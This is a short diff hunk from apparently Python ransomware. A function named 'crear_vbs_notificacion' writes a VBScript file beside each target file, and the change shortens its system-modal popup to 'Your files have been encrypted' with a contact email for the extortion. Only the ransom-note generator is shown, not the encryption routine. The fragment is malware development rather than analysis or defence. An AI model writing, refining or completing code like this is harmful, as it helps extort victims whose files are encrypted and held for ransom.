@@ -48,7 +48,7 @@ def crear_vbs_notificacion(ruta_archivo):
         nombre_base = os.path.splitext(ruta_archivo)[0]
         vbs_path = nombre_base + ".vbs"
         vbs_content = """On Error Resume Next
-MsgBox "Your files, database, and other information have been encrypted and stolen. To recover them, please use the following email address: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
+MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
 
 Dim fso, scriptPath
 Set fso = CreateObject("Scripting.FileSystemObject")
